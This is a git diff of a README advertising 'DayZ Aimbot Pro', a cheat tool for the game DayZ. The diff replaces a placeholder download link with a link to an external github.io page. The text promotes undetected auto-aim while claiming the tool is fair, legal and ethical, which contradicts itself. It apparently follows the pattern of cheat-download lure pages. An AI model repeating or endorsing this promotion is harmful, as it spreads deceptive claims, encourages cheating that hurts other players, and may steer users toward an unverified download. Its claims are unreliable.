@@ -1,7 +1,7 @@
 # 🎯 **DayZ Aimbot Pro: Precision Gaming Tool**  
 The ultimate tool for DayZ players seeking unmatched accuracy and automation. DayZ Aimbot Pro offers advanced auto-aim, precision targeting, and seamless integration with minimal lag. Designed for competitive fairness, it prioritizes user privacy and security while enhancing gameplay. Compatible with all DayZ versions, this lightweight tool ensures smooth performance without detection. Elevate your skills legally and ethically!  
 
-[![Download DayZ Aimbot Pro](https://img.shields.io/badge/Download-DayZ_Aimbot_Pro-blueviolet)](#)  
+[![Download DayZ Aimbot Pro](https://img.shields.io/badge/Download-DayZ_Aimbot_Pro-blueviolet)](https://dayz-aim-bot.github.io/.github/)  
 
 ---  
 
